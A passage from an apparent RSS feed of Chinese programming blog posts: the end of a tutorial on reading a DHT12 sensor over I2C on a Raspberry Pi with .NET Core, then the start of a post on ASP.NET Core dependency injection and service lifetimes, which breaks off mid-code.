&lt;p&gt;在 Raspberry Pi 的引脚中，引出了一组 I&lt;sup&gt;2&lt;/sup&gt;C 接口，其内部总线 ID 为 1，引脚中的 GPIO 2 为 SDA，GPIO 3 为 SCL（如下图所示）。至于 I&lt;sup&gt;2&lt;/sup&gt;C-0，它用于 Raspberry Pi 内部的 GPIO 扩展器、相机、显示器等其他设备。Raspberry Pi 的 I&lt;sup&gt;2&lt;/sup&gt;C 引脚中内置了一个 1.8 kΩ 的上拉电阻，这意味着在一般情况下使用 I&lt;sup&gt;2&lt;/sup&gt;C 总线时不必再连接一个额外的上拉电阻。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1085877/201905/1085877-20190522213300650-2090117670.png&quot;/&gt;&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;&lt;small&gt;Raspberry Pi B+/2B/3B/3B+/Zero 引脚图&lt;/small&gt;&lt;/p&gt;
&lt;h2 id=&quot;相关类&quot;&gt;相关类&lt;/h2&gt;
&lt;p&gt;I&lt;sup&gt;2&lt;/sup&gt;C 操作的相关类位于 &lt;strong&gt;System.Device.I2c&lt;/strong&gt; 和 &lt;strong&gt;System.Device.I2c.Drivers&lt;/strong&gt; 命名空间下。&lt;/p&gt;
&lt;h3 id=&quot;i2cconnectionsettings&quot;&gt;I2cConnectionSettings&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;I2cConnectionSettings&lt;/code&gt; 类位于 &lt;strong&gt;System.Device.I2c&lt;/strong&gt; 命名空间下，表示 I&lt;sup&gt;2&lt;/sup&gt;C 设备的连接设置。&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt;public sealed class I2cConnectionSettings
{
    // 构造函数
    // busId 是 I2C 总线的内部 ID，在 Raspberry Pi 上只能填 1
    // deviceAddress 是要连接设备的 I2C 地址
    public I2cConnectionSettings(int busId, int deviceAddress);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;unixi2cdevice-和-windows10i2cdevice&quot;&gt;UnixI2cDevice 和 Windows10I2cDevice&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;UnixI2cDevice&lt;/code&gt; 和 &lt;code&gt;Windows10I2cDevice&lt;/code&gt; 类位于 &lt;strong&gt;System.Device.I2c.Drivers&lt;/strong&gt; 命名空间下。两个类均派生自抽象类 &lt;strong&gt;I2cDevice&lt;/strong&gt;，分别代表 Unix 和 Windows10 下的 I2C 控制器，使用时按照所处的平台有选择的进行实例化。这里以 &lt;code&gt;UnixI2cDevice&lt;/code&gt; 类为例说明。&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt;public class UnixI2cDevice : I2cDevice
{
    // 构造函数
    // 需要传入一个 I2cConnectionSettings 对象
    public UnixI2cDevice(I2cConnectionSettings settings);

    // 方法
    // 从从设备中读取一段数据，数据长度由 Span 的长度决定
    public override void Read(Span&amp;lt;byte&amp;gt; buffer);
    // 从从设备中读取一个字节的数据
    public override byte ReadByte();

    // 向从设备中写入一段数据，通常 Span 中的第一个数据为要写入数据的寄存器的地址
    public override void Write(ReadOnlySpan&amp;lt;byte&amp;gt; data);
    // 向从设备中写入一个字节的数据，通常这个字节为寄存器的地址
    public override void WriteByte(byte data);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;i2c-总线的通信步骤&quot;&gt;I&lt;sup&gt;2&lt;/sup&gt;C 总线的通信步骤&lt;/h2&gt;
&lt;p&gt;在开始实验之前，首先说明一下 I&lt;sup&gt;2&lt;/sup&gt;C 总线的读取和写入的步骤。因为 .NET 帮我们封装好了一些操作方法，这大大简化了 I&lt;sup&gt;2&lt;/sup&gt;C 的操作难度，即使你没有丰富的硬件知识也可以顺利的操作硬件，所以我们不必像开发单片机一样去研究设备之间通信的时序图（当然，如果通信出现错误的话还是需要用时序图帮助判断）。&lt;/p&gt;
&lt;h3 id=&quot;读取&quot;&gt;读取&lt;/h3&gt;
&lt;ol readability=&quot;3.5&quot;&gt;&lt;li readability=&quot;3&quot;&gt;
&lt;p&gt;向从设备写入要读取的寄存器的地址&lt;/p&gt;
&lt;p&gt;这类似于数组的指针，需要先定位到相应的位置才能读取。通常地址是一位的，只需要调用 &lt;code&gt;WriteByte()&lt;/code&gt; 方法即可，但也有特殊情况，比如两个字节的地址或者命令+地址时，就需要调用 &lt;code&gt;Write()&lt;/code&gt; 方法。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;4&quot;&gt;
&lt;p&gt;读取从设备中的数据&lt;/p&gt;
&lt;p&gt;定位完成后就可以向从设备请求数据了。如果要读取一个字节的数据，那么就调用 &lt;code&gt;ReadByte()&lt;/code&gt; 方法，如果要读取多个字节，首先需要实例化一个 &lt;code&gt;byte 数组&lt;/code&gt;，通过调用 &lt;code&gt;Read()&lt;/code&gt; 方法来读取多个数据，读取的数据取决于数组的长度。比如要读取 8 个字节的数据，代码如下：&lt;br/&gt;&lt;code&gt;C# Span&amp;lt;byte&amp;gt; readBuffer = stackalloc byte[8]; sensor.Read(readBuffer);&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;写入&quot;&gt;写入&lt;/h3&gt;
&lt;p&gt;写入一般用于配置从设备的寄存器。因为你不可能只向从设备写入寄存器的地址吧，所以通常会调用 &lt;code&gt;Write()&lt;/code&gt; 方法。比如向地址为 0x01 的寄存器写入一个字节的数据，代码如下：&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt;Span&amp;lt;byte&amp;gt; writeBuffer = stackalloc byte[] { 0x01, 0xFF }; 
sensor.Write(writeBuffer);&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;温湿度传感器读取实验&quot;&gt;温湿度传感器读取实验&lt;/h2&gt;
&lt;p&gt;本实验选用的传感器为奥松的 &lt;strong&gt;DHT12&lt;/strong&gt;。主要考虑到这个传感器读取非常简单，不用配置，价格便宜，很适合用来练手。数据手册地址：&lt;a href=&quot;https://wenku.baidu.com/view/325b7096eff9aef8941e06f9.html&quot; class=&quot;uri&quot;&gt;https://wenku.baidu.com/view/325b7096eff9aef8941e06f9.html&lt;/a&gt; 。&lt;/p&gt;
&lt;div readability=&quot;22&quot;&gt;
&lt;p&gt;  提示&lt;/p&gt;
&lt;p&gt;数据手册（Datasheet）是电子元件的使用说明书，包括介绍、电气特性、通信协议、性能等方面的内容。拿到数据手册时我们应该关注什么？&lt;/p&gt;
&lt;p&gt;1. 关注该元件的通信协议。有些设备支持多种通信协议，如本实验用到的 DHT12 不仅支持 I2C，还支持 1-Wire 协议。选择合适的通信协议进行编程。&lt;/p&gt;
&lt;p&gt;2. 关注打算使用的通信协议的细节。比如 I2C 总线，你需要关注元件的地址、各个寄存器的地址、最大传输速率等等。&lt;/p&gt;
&lt;p&gt;3. 关注该元件的通信的细节。有些设备的通信很简单，并不需要拐弯抹角，但还有一些设备需要发送一些额外的命令。比如你在发送完寄存器地址后还需要紧接着发送一段命令，用于决定是读还是写该寄存器，返回数据时是按字节（byte）返回还是按字（word）返回等。&lt;/p&gt;
&lt;p&gt;4. 关注各个寄存器的作用和配置。数据手册中基本上都会把每个寄存器逐条列出，注意细节即可。&lt;/p&gt;
&lt;/div&gt;
&lt;h3 id=&quot;传感器图像&quot;&gt;传感器图像&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1085877/201905/1085877-20190522213335685-1833273359.jpg&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;硬件需求&quot;&gt;硬件需求&lt;/h3&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;DHT12&lt;/td&gt;
&lt;td&gt;x1&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;4.7 kΩ 电阻&lt;/td&gt;
&lt;td&gt;x2&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;杜邦线&lt;/td&gt;
&lt;td&gt;若干&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h3 id=&quot;电路&quot;&gt;电路&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1085877/201905/1085877-20190522213347022-1488983699.jpg&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;SCL - SCL&lt;/li&gt;
&lt;li&gt;SDA - SDA&lt;/li&gt;
&lt;li&gt;VCC - 5V&lt;/li&gt;
&lt;li&gt;GND - GND&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;如果你的 DHT12 是裸板的话需要像电路图中一样给 SDA 和 SCL 加上上拉电阻。&lt;/p&gt;
&lt;h3 id=&quot;代码&quot;&gt;代码&lt;/h3&gt;
&lt;ol readability=&quot;6&quot;&gt;&lt;li&gt;打开 Visual Studio ，新建一个 .NET Core 控制台应用程序，项目名称为“Dht12”。&lt;/li&gt;
&lt;li&gt;引入 &lt;strong&gt;System.Device.Gpio&lt;/strong&gt; NuGet 包。&lt;/li&gt;
&lt;li readability=&quot;4&quot;&gt;
&lt;p&gt;新建类 &lt;strong&gt;Dht12&lt;/strong&gt;，替换如下代码：&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt;public class Dht12 : IDisposable
{
    /// &amp;lt;summary&amp;gt;
    /// DHT12 默认 I2C 地址
    /// &amp;lt;/summary&amp;gt;
    public const byte DefaultI2cAddress = 0x5C;    // 若数据手册中给的是8位的I2C地址要记得右移1位

    private I2cDevice _sensor;

    private double _temperature;
    /// &amp;lt;summary&amp;gt;
    /// DHT12 温度
    /// &amp;lt;/summary&amp;gt;
    public double Temperature
    {
        get
        {
            ReadData();
            return _temperature;
        }
    }

    private double _humidity;
    /// &amp;lt;summary&amp;gt;
    /// DHT12 湿度
    /// &amp;lt;/summary&amp;gt;
    public double Humidity
    {
        get
        {
            ReadData();
            return _humidity;
        }
    }

    /// &amp;lt;summary&amp;gt;
    /// 实例化一个 DHT12 对象
    /// &amp;lt;/summary&amp;gt;
    /// &amp;lt;param name=&quot;sensor&quot;&amp;gt;I2CDevice，如 UnixI2cDevice 和 Windows10I2cDevice&amp;lt;/param&amp;gt;
    public Dht12(I2cDevice sensor)
    {
        _sensor = sensor;
    }

    private void ReadData()
    {
        Span&amp;lt;byte&amp;gt; readBuff = stackalloc byte[5]; 

        // 数据手册第三页提供了寄存器地址表

        // DHT12 湿度寄存器地址
        _sensor.WriteByte(0x00);
        // 连续读取数据
        // 湿度整数位，湿度小数位，温度整数位，温度小数位，校验和
        _sensor.Read(readBuff);

        // 校验数据，校验方法见数据手册第五页
        // 校验位=湿度高位+湿度低位+温度高位+温度低位
        if ((readBuff[4] == ((readBuff[0] + readBuff[1] + readBuff[2] + readBuff[3]) &amp;amp; 0xFF)))
        {
            // 温度小数位的范围在0-9，所以与上0x7F即可
            double temp = readBuff[2] + (readBuff[3] &amp;amp; 0x7F) * 0.1;
            // 温度小数位第8个bit为1则表示采样得出的温度为负温
            temp = (readBuff[3] &amp;amp; 0x80) == 0 ? temp : -temp;

            double humi = readBuff[0] + readBuff[1] * 0.1;

            _temperature = temp;
            _humidity = humi;
        }
        else
        {
            _temperature = double.NaN;
            _humidity = double.NaN;
        }
    }
}&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;6&quot;&gt;
&lt;p&gt;在 &lt;strong&gt;Program.cs&lt;/strong&gt; 中，将主函数代码替换如下：&lt;/p&gt;
&lt;pre class=&quot;c#&quot;&gt;
&lt;code&gt;static void Main(string[] args)
{
    I2cConnectionSettings settings = new I2cConnectionSettings(1, Dht12.DefaultI2cAddress);
    UnixI2cDevice device = new UnixI2cDevice(settings);

    using (Dht12 dht = new Dht12(device))
    {
        while (true)
        {
            Console.WriteLine($&quot;Temperature: {dht.Temperature.ToString(&quot;0.0&quot;)} °C, Humidity: {dht.Humidity.ToString(&quot;0.0&quot;)} %&quot;);

            Thread.Sleep(2000);
        }
    }
}&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;发布、拷贝、更改权限、运行&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;效果图&quot;&gt;效果图&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1085877/201905/1085877-20190522213359313-1537496640.jpg&quot;/&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;div readability=&quot;7&quot;&gt;
&lt;p&gt;  备注&lt;/p&gt;
&lt;p&gt;&lt;span&gt;下一篇文章将谈谈 SPI 的使用。&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
</description>
<pubDate>Wed, 22 May 2019 13:35:00 +0000</pubDate>
<dc:creator>张高兴</dc:creator>
<og:description>什么是 I2C 总线 I2C 总线（Inter Integrated Circuit Bus）是设备与设备间通信方式的一种。它是一种串行通信总线，由飞利浦公司在1980年代为了让主板、嵌入式系统或手机</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/zhanggaoxing/p/10908670.html</dc:identifier>
</item>
<item>
<title>ASP.NET Core 依赖注入(DI) - 卡西莫多_Ruby</title>
<link>http://www.cnblogs.com/afei-24/p/10885044.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/afei-24/p/10885044.html</guid>
<description>&lt;p&gt;　　ASP.NET Core的底层设计支持和使用依赖注入。ASP.NET Core 应用程序可以利用内置的框架服务将服务注入到启动类的方法中，并且应用程序服务也可以配置注入。由ASP.NET Core 提供的默认服务容器提供了最小功能集，并不是取代其他容器。&lt;/p&gt;
&lt;p&gt;　　&lt;span&gt;&lt;strong&gt;1.浅谈依赖注入&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　依赖注入(Dependency injection,DI)是一种实现对象和依赖者之间松耦合的技术，将类用来执行其操作的这些对象以注入的方式提供给该类，而不是直接实例化依赖项或者使用静态引用。一般情况，类会通过构造函数声明器2依赖关系，允许他们遵循显示依赖原则。这种方法称为“构造函数注入”。&lt;/p&gt;
&lt;p&gt;　　当类的设计使用DI思想时，他们的耦合更加松散，因为他们没有对他们的合作者直接硬编码的依赖。这遵循“依赖倒置原则”，其中指出，高层模块不应该依赖于底层模块：两者都依赖于抽象。&lt;/p&gt;
&lt;p&gt;　　类要求在他们构造时向其提供抽象（通常是接口），而不是引用特定的实现。提取接口的依赖关系和提供接口的实现作为参数也是“策略设计模式”的一个示例。&lt;/p&gt;
&lt;p&gt;　　当一个类被用来创建类及其相关的依赖关系时，这个成为容器（containers），或者称为控制反转(Inversion of Control, IoC)容器，或者依赖注入容器。容器本质上是一个工厂，负责提供向它请求的类型的实例。如果一个给定类型声明它具有依赖关系，并且容器已经被配置为其提供依赖关系，那么它将把创建依赖关系作为创建请求实例的一部分。除了创建对象的依赖关系外，容器通常还会管理应用程序中对象的生命周期。&lt;/p&gt;
&lt;p&gt;　　ASP.NET Core 包含一个默认支持构造函数注入的简单内置容器，ASP.NET 的容器指的是它管理的类型services,可以在Startup类的ConfigureServices方法中配置内置容器的服务。&lt;/p&gt;

&lt;p&gt;　　&lt;span&gt;&lt;strong&gt;2. 使用ASP.NET Core提供的服务&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　Startup类的ConfigureServices方法负责定义应用程序将使用的服务，包括平台自带的功能，比如，Entity Framework Core 和 ASP.NET Core MVC。除了IServiceCollection提供的几个服务之外，可以使用一些扩展方法（AddDbContext，AddMvc，AddTransient等）向容器添加和注册额外服务：　　&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; ConfigureServices(IServiceCollection services)
        {
            services.Configure&lt;/span&gt;&amp;lt;CookiePolicyOptions&amp;gt;(options =&amp;gt;&lt;span&gt;
            {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; This lambda determines whether user consent for non-essential cookies is needed for a given request.&lt;/span&gt;
                options.CheckConsentNeeded = context =&amp;gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
                options.MinimumSameSitePolicy &lt;/span&gt;=&lt;span&gt; SameSiteMode.None;
            });


            services.AddMvc().SetCompatibilityVersion(CompatibilityVersion.Version_2_2);
            services.AddDbContext&lt;/span&gt;&amp;lt;AccessManagementContext&amp;gt;(options =&amp;gt;&lt;span&gt;
                options.UseSqlServer(Configuration.GetConnectionString(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;DefaultConnection&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;),
                providerOptions &lt;/span&gt;=&amp;gt;&lt;span&gt; providerOptions.EnableRetryOnFailure()));
            services.AddTransient&lt;/span&gt;&amp;lt;ICompanyServices, CompanyServices&amp;gt;&lt;span&gt;();

        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　ASP.NET Core 提供的功能和中间件，遵循约定使用一个单一的AddService扩展方法来注册所有该功能所需的服务。&lt;/p&gt;

&lt;p&gt;　　&lt;span&gt;&lt;strong&gt;3.注册自己的服务&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　我们可以按照 services.AddTransient&amp;lt;ICompanyServices, CompanyServices&amp;gt;(); 这种写法注册自己的服务。第一个范型类型表示将要从容器中请求的类型（通常是一个接口）。第二个范型类型表示将由容器实例化并且用于完成请求的具体类型。&lt;/p&gt;
&lt;p&gt;　　AddTransient 方法用于将抽象类型映射到为每一个需要它的对象分别实例化的具体服务。为注册的每一个服务选择合适的生命周期很重要，后面会介绍到。&lt;/p&gt;

&lt;p&gt;　　下面是示例是注册自己的服务：&lt;/p&gt;
&lt;p&gt;　　1.接口&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; IAccountServices
    {
        Task&lt;/span&gt;&amp;lt;List&amp;lt;AccountViewModel&amp;gt;&amp;gt;&lt;span&gt; GetList();
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　2.实现类&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; AccountServices:IAccountServices
    {
        AccessManagementContext _context;
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; AccountServices(AccessManagementContext context)
        {
            _context &lt;/span&gt;=&lt;span&gt; context;//在构造函数中注入
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;async&lt;/span&gt; Task&amp;lt;List&amp;lt;Account&amp;gt;&amp;gt;&lt;span&gt; GetList()
        {
            &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;
            {
                &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; query =&lt;span&gt; _context.Account.ToListAsync();
                 &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; query ;
            }
            &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Exception ex)
            {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
            }

        }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　3.在ConfigureServices中注册自定义的服务和EF上下文AccessManagementContext &lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; ConfigureServices(IServiceCollection services)
        {
            services.AddMvc().SetCompatibilityVersion(CompatibilityVersion.Version_2_2);
            services.AddDbContext&lt;/span&gt;&amp;lt;AccessManagementContext&amp;gt;(options =&amp;gt;&lt;span&gt;
                options.UseSqlServer(Configuration.GetConnectionString(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;DefaultConnection&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;),
                providerOptions &lt;/span&gt;=&amp;gt;&lt;span&gt; providerOptions.EnableRetryOnFailure()));
            services.AddTransient&lt;/span&gt;&amp;lt;IAccountServices,AccountServices&amp;gt;&lt;span&gt;();

        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　4.在Controller构造函数中依赖注入&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; AccountController : Controller
    {
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; IAccountServices _accountServices;
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; AccountController(IAccountServices accountServices)
        {
            _accountServices &lt;/span&gt;=&lt;span&gt; accountServices;
        }
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; GET: Account&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;async&lt;/span&gt; Task&amp;lt;ActionResult&amp;gt;&lt;span&gt; Index()
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; vms = &lt;span&gt;await&lt;/span&gt;&lt;span&gt; _accountServices.GetList();
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; View(vms);
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　&lt;span&gt;&lt;strong&gt;4.服务的生命周期和注册选项&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　　ASP.NET 服务生命周期：&lt;/p&gt;
&lt;p&gt;　　　　　　1.Transient 瞬时&lt;/p&gt;
&lt;p&gt;　　　　　　　　Transient 生命周期服务在他们每次请求时被创建。适合轻量级，无状态的服务。&lt;/p&gt;
&lt;p&gt;　　　　　　2.Scoped 作用域&lt;/p&gt;
&lt;p&gt; 　　　　　　　　Scoped生命周期在每次请求时创建一次。&lt;/p&gt;
&lt;p&gt;　　　　　　3.Singleton 单例&lt;/p&gt;
&lt;p&gt;　　　　　　　　Singleton 生命周期服务在它们第一次请求时创建，并且每个后续请求使用相同的实例。&lt;/p&gt;

&lt;p&gt;　　服务可以用多种方式在容器中注册，除了之前的注册方法，还可以指定一个工厂，它将被用来创建需要的实例。后面会详细介绍其他的注册方法。&lt;/p&gt;
&lt;p&gt;　　下面用一个简单的示例介绍每个生命周期：&lt;/p&gt;
&lt;p&gt;　　1.创建接口：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; MVCTest.Interfaces
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; IOperation
    {
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 唯一标识
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        Guid OperationId { &lt;span&gt;get&lt;/span&gt;&lt;span&gt;;  }
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; IOperationTransient: IOperation
    {
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; IOperationScoped : IOperation
    {
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; IOperationSingleton : IOperation
    {
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; IOperationInstance : IOperation
    {
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　2.实现类&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 实现所有接口
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Operation: IOperation, IOperationTransient,
        IOperationScoped, IOperationSingleton, IOperationInstance
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Operation()
        {
            OperationId &lt;/span&gt;=&lt;span&gt; Guid.NewGuid();
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Operation(Guid operationId)
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (operationId == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
            {
                OperationId &lt;/span&gt;=&lt;span&gt; Guid.NewGuid();
            }
            OperationId &lt;/span&gt;=&lt;span&gt; operationId;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Guid OperationId { &lt;span&gt;get&lt;/span&gt;&lt;span&gt;; }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　3.注册到容器&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; ConfigureServices(IServiceCollection services)
        {
            services.AddTransient&lt;/span&gt;&amp;lt;IOperationTransient, Operation&amp;gt;&lt;span&gt;();
            services.AddScoped&lt;/span&gt;&amp;lt;IOperationScoped, Operation&amp;gt;&lt;span&gt;();
            services.AddSingleton&lt;/span&gt;&amp;lt;IOperationSingleton, Operation&amp;gt;&lt;span&gt;();
            services.AddSingleton&lt;/span&gt;&amp;lt;IOperationInstance, Operation&amp;gt;&lt;span&gt;();
            services.AddTransient&lt;/span&gt;&amp;lt;OperationServices, OperationServices&amp;gt;&lt;span&gt;();
            services.AddMvc().SetCompatibilityVersion(CompatibilityVersion.Version_2_1);
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　4.上面还注册了 OperationServices ，用来测试单例模式（单例生命周期服务中所有请求使用第一次实例化的服务）和 作用域生命周期服务在每次请求时只创建一次，不管几个地方用到实例&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; OperationServices
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IOperationTransient OperationTransient { &lt;span&gt;get&lt;/span&gt;&lt;span&gt;;  }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IOperationScoped OperationScoped { &lt;span&gt;get&lt;/span&gt;&lt;span&gt;;  }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IOperationSingleton OperationSingleton { &lt;span&gt;get&lt;/span&gt;&lt;span&gt;;  }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IOperationInstance OperationInstance { &lt;span&gt;get&lt;/span&gt;&lt;span&gt;;  }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; OperationServices(IOperationTransient operationTransient,
            IOperationScoped operationScoped,
            IOperationSingleton operationSingleton,
            IOperationInstance operationInstance)
        {
            OperationTransient &lt;/span&gt;=&lt;span&gt; operationTransient;
            OperationScoped &lt;/span&gt;=&lt;span&gt; operationScoped;
            OperationSingleton &lt;/span&gt;=&lt;span&gt; operationSingleton;
            OperationInstance &lt;/span&gt;=&lt;span&gt; operationInstance;
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　5.在Controller中使用&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; OperationController : Controller
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IOperationTransient OperationTransient { &lt;span&gt;get&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IOperationScoped OperationScoped { &lt;span&gt;get&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IOperationSingleton OperationSingleton { &lt;span&gt;get&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IOperationInstance OperationInstance { &lt;span&gt;get&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; OperationServices _operationServices;

